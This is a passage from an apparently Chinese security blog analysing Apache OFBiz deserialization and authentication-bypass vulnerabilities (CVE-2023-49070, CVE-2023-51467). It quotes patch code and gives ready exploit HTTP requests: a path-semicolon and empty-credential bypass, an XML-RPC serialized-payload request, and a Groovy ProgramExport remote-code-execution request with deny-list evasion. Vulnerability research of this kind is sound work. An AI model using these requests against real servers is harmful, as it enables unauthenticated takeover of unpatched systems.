AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>767</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">ser</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">cus-obj</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">payload</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">cus-obj</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">ser</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">官方补丁中采用黑名单的方式增加对java.rmi.server的限制，</font><a href="https://github.com/apache/ofbiz-framework/commit/af9ed4e#diff-c0e9a4bd325bc9530a752224575a9f3942e7cba19d61001836214c50d56aa9fcR72">https://github.com/apache/ofbiz-framework/commit/af9ed4e#diff-c0e9a4bd325bc9530a752224575a9f3942e7cba19d61001836214c50d56aa9fcR72</a>。</p><p><font style="color:#000000;">由于这种修复方式依旧没有解决白名单绕过的问题，r00t4dm师傅利用javax.management.remote.rmi.RMIConnectionImpl_Stub绕过了该补丁（CVE-2021-29200），参考</font><a href="https://xz.aliyun.com/t/9556?time__1311=n4+xnD0DuAeWqxYq40HpDUrOWDkC1DBBiKbrYD">Apache OFBiz CVE-2021-29200 简要分析</a><font style="color:#000000;">。</font></p><h2 id="Bypas-Auth"><a href="#Bypas-Auth" class="headerlink" title="Bypas Auth"></a><font style="color:#000000;">Bypas Auth</font></h2><h3 id="CVE-2023-49070"><a href="#CVE-2023-49070" class="headerlink" title="CVE-2023-49070"></a>CVE-2023-49070</h3><p><font style="color:#000000;">上文提到了，对于XMLRPC相关的漏洞增加了两个主要的修复方式，那如果想让漏洞重新变为一个Pre-Auth RCE漏洞，需要满足如下条件：</font></p><ol><li><strong><font style="color:#000000;">绕过对于&lt;&#x2F;serializable这个关键词的检测</font></strong></li><li><strong><font style="color:#000000;">绕过对XML-RPC这个接口的认证</font></strong></li></ol><p><font style="color:#000000;">上文已经知道了补丁的信息，增加了一个CacheFilter来进行防护，可以看到首先会匹配当前uri是否为&#x2F;control&#x2F;xmlrpc，如果路由符合的话会判断请求体中是否包含&lt;&#x2F;serializable关键词，匹配到了则进行拦截。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Get the request URI without the webapp mount point.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> ((HttpServletRequest) request).getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uriWithContext</span> <span class="operator">=</span> ((HttpServletRequest) request).getRequestURI();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> uriWithContext.substring(context.length());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;/control/xmlrpc&quot;</span>.equals(uri.toLowerCase())) &#123;</span><br><span class="line">        <span class="comment">// Read request.getReader() as many time you need</span></span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">RequestWrapper</span>((HttpServletRequest) request);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> request.getReader().lines().collect(Collectors.joining());</span><br><span class="line">        <span class="keyword">if</span> (body.contains(<span class="string">&quot;&lt;/serializable&quot;</span>)) &#123;</span><br><span class="line">            Debug.logError(<span class="string">&quot;Content not authorised for security reason&quot;</span>, <span class="string">&quot;CacheFilter&quot;</span>); <span class="comment">// Cf. OFBIZ-12332</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在Java中，部分中间件如Tomcat可以通过;的方式，在路径中增加Matrix Parameters来进行绕过，</font><a href="https://www.baeldung.com/cs/url-matrix-vs-query-parameters">https://www.baeldung.com/cs/url-matrix-vs-query-parameters</a>。<font style="color:#000000;">尝试在XML-RPC请求的路径中增加分号&#x2F;webtools&#x2F;control&#x2F;xmlrpc;&#x2F;，可以看到此时uri已经变成&#x2F;control&#x2F;xmlrpc;&#x2F;，绕过了这里的限制。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734401953859-801c2846-16a4-4402-9fe2-2e81822a8aad.png"></p><p>此时绕过了对于&lt;&#x2F;serializable这个关键词的检测，可以看到服务器返回了登录界面，因此还需要绕过对XML-RPC这个接口的认证。</p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734402182734-3a2957cb-b5fd-4f1d-88b1-7828e75a6a5f.png"></p><p><font style="color:#000000;">在org.apache.ofbiz.webapp.control.LoginWorker#checkLogin方法下断点，该函数用于检查用户是否登录。注意到一个关键的判断</font><strong><font style="color:#000000;">“username &#x3D;&#x3D; null || (password &#x3D;&#x3D; null &amp;&amp; token &#x3D;&#x3D; null) || “error”.equals(login(request, response)”</font></strong><font style="color:#000000;">，此时当username和password不为null，且login方法的返回值不为error即可绕过。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">checkLogin</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">GenericValue</span> <span class="variable">userLogin</span> <span class="operator">=</span> checkLogout(request, response);</span><br><span class="line">    <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (userLogin == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// check parameters</span></span><br><span class="line">        username = request.getParameter(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">        password = request.getParameter(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">        token = request.getParameter(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line">        <span class="comment">// check session attributes</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="literal">null</span>) username = (String) session.getAttribute(<span class="string">&quot;USERNAME&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (password == <span class="literal">null</span>) password = (String) session.getAttribute(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="literal">null</span>) token = (String) session.getAttribute(<span class="string">&quot;TOKEN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// in this condition log them in if not already; if not logged in or can&#x27;t log in, save parameters and return error</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="literal">null</span></span><br><span class="line">                || (password == <span class="literal">null</span> &amp;&amp; token == <span class="literal">null</span>)</span><br><span class="line">                || <span class="string">&quot;error&quot;</span>.equals(login(request, response))) &#123;</span><br><span class="line">            request.removeAttribute(<span class="string">&quot;_LOGIN_PASSED_&quot;</span>);</span><br><span class="line">            session.setAttribute(<span class="string">&quot;_PREVIOUS_REQUEST_&quot;</span>, request.getPathInfo());</span><br><span class="line">            Map&lt;String, Object&gt; urlParams = UtilHttp.getUrlOnlyParameterMap(request);</span><br><span class="line">            <span class="keyword">if</span> (UtilValidate.isNotEmpty(urlParams)) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_URL_&quot;</span>, urlParams);</span><br><span class="line">            &#125;</span><br><span class="line">            Map&lt;String, Object&gt; formParams = UtilHttp.getParameterMap(request, urlParams.keySet(), <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (UtilValidate.isNotEmpty(formParams)) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">&quot;_PREVIOUS_PARAM_MAP_FORM_&quot;</span>, formParams);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Allow loggingOut when impersonated</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isLoggingOut</span> <span class="operator">=</span> <span class="string">&quot;logout&quot;</span>.equals(RequestHandler.getRequestUri(request.getPathInfo()));</span><br><span class="line">    <span class="comment">//Check if the user has an impersonation in process</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">authoriseLoginDuringImpersonate</span> <span class="operator">=</span> EntityUtilProperties.propertyValueEquals(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;security.login.authorised.during.impersonate&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!isLoggingOut &amp;&amp; !authoriseLoginDuringImpersonate &amp;&amp; checkImpersonationInProcess(request, response) != <span class="literal">null</span>) &#123;</span><br><span class="line">        request.removeAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;impersonated&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734402943170-70799cc4-b629-47de-a925-20eba49c0d56.png"></p><p><font style="color:#000000;">跟进org.apache.ofbiz.webapp.control.LoginWorker#login方法，注意到如下几行代码，可以看到当unpwErrMsgList不为空且requirePasswordChange参数值为Y时，返回的结果即为requirePasswordChange而不是error，满足前文绕过需求。而要使得unpwErrMsgList不为，则需要满足username为空或者password和token同时为空，因此可以构造传参为</font><strong><font style="color:#000000;">USERNAME&#x3D;&amp;PASSWORD&#x3D;&amp;token&#x3D;&amp;requirePasswordChange&#x3D;Y</font></strong><font style="color:#000000;">。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; unpwErrMsgList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;String&gt;();</span><br><span class="line"><span class="keyword">if</span> (UtilValidate.isEmpty(username)) &#123;</span><br><span class="line">    unpwErrMsgList.add(UtilProperties.getMessage(resourceWebapp, <span class="string">&quot;loginevents.username_was_empty_reenter&quot;</span>, UtilHttp.getLocale(request)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (UtilValidate.isEmpty(password) &amp;&amp; UtilValidate.isEmpty(token)) &#123;</span><br><span class="line">    unpwErrMsgList.add(UtilProperties.getMessage(resourceWebapp, <span class="string">&quot;loginevents.password_was_empty_reenter&quot;</span>, UtilHttp.getLocale(request)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">requirePasswordChange</span> <span class="operator">=</span> <span class="string">&quot;Y&quot;</span>.equals(request.getParameter(<span class="string">&quot;requirePasswordChange&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (!unpwErrMsgList.isEmpty()) &#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>, unpwErrMsgList);</span><br><span class="line">    <span class="keyword">return</span>  requirePasswordChange ? <span class="string">&quot;requirePasswordChange&quot;</span> : <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞利用数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc/;/?USERNAME=&amp;PASSWORD=&amp;token=&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4093</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">           </span><span class="template-variable">&#123;&#123;<span class="name">Base64_Payload</span>&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734404509876-d372a125-2707-4e7b-b8f2-0fad19ca5cd7.png"></p><p><font style="color:#000000;">OBFiz官方对于CVE-2023-49070的修复方式是直接移除了XML-RPC相关的逻辑</font><a href="https://github.com/apache/ofbiz-framework/commit/c59336f604f503df5b2f7c424fd5e392d5923a27">https://github.com/apache/ofbiz-framework/commit/c59336f604f503df5b2f7c424fd5e392d5923a27</a><font style="color:#000000;">，但是认证绕过的问题其实并没有处理。</font></p><h3 id="CVE-2023-51467"><a href="#CVE-2023-51467" class="headerlink" title="CVE-2023-51467"></a><font style="color:rgb(51, 51, 51);">CVE-2023-51467</font></h3><p><font style="color:#000000;">上文在分析CVE-2023-49070时，其补丁并未修复认证绕过的问题，因此导致了依旧可以利用鉴权绕过来访问任意接口。在后台中，注意到路由webtools&#x2F;control&#x2F;ProgramExport可以执行Groovy脚本。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734432201978-9aeb7a72-c23b-4099-9f5d-0c16d4c5e687.png"></p><p><font style="color:#000000;">跟进一下ProgramExport对应的视图配置，可以看到会去调用ProgramExport.groovy来执行Groovy脚本。</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view-map</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span> <span class="attr">type</span>=<span class="string">&quot;screen&quot;</span> <span class="attr">page</span>=<span class="string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">screen</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;titleProperty&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PageTitleEntityExportAll&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;tabButtonItem&quot;</span> <span class="attr">value</span>=<span class="string">&quot;programExport&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">location</span>=<span class="string">/</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">widgets</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">decorator-screen</span> <span class="attr">name</span>=<span class="string">&quot;CommonImportExportDecorator&quot;</span> <span class="attr">location</span>=<span class="string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                     <span class="tag">&lt;<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                        <span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://webtools/widget/MiscForms.xml&quot;</span>/&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                    <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                    <span class="tag">&lt;<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                        <span class="tag">&lt;<span class="name">platform-specific</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                            <span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">html-template</span> <span class="attr">location</span>=<span class="string">&quot;component://webtools/template/entity/ProgramExport.ftl&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                        <span class="tag">&lt;/<span class="name">platform-specific</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                    <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">decorator-screen</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">widgets</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">screen</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在ProgramExport.groovy中，利用org.apache.ofbiz.security.SecuredUpload#isValidText方法来检测是否是Webshell。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734432652162-59c17798-e92d-4393-9fef-b9ed9fab6978.png"></p><p><font style="color:#000000;">在SecuredUpload#isValidText方法中，通过读取配置文件</font><font style="color:rgb(6, 6, 7);">来获取不允许的WebShell Token。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isValidText</span><span class="params">(String content, List&lt;String&gt; allowed)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> content != <span class="literal">null</span> ? DENIEDWEBSHELLTOKENS.stream().allMatch(token -&gt; isValid(content, token.toLowerCase(), allowed)) : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; DENIEDWEBSHELLTOKENS = getDeniedWebShellTokens();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">getDeniedWebShellTokens</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">deniedTokens</span> <span class="operator">=</span> UtilProperties.getPropertyValue(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;deniedWebShellTokens&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> UtilValidate.isNotEmpty(deniedTokens) ? StringUtil.split(deniedTokens, <span class="string">&quot;,&quot;</span>) : <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734433494354-d3abea17-dda4-4429-b267-8444850a57c7.png"></p><p>简单Bypass以下即可实现RCE的目的，例如字符拼接或者编码等。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/ProgramExport?USERNAME=&amp;PASSWORD=&amp;token=&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>618</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 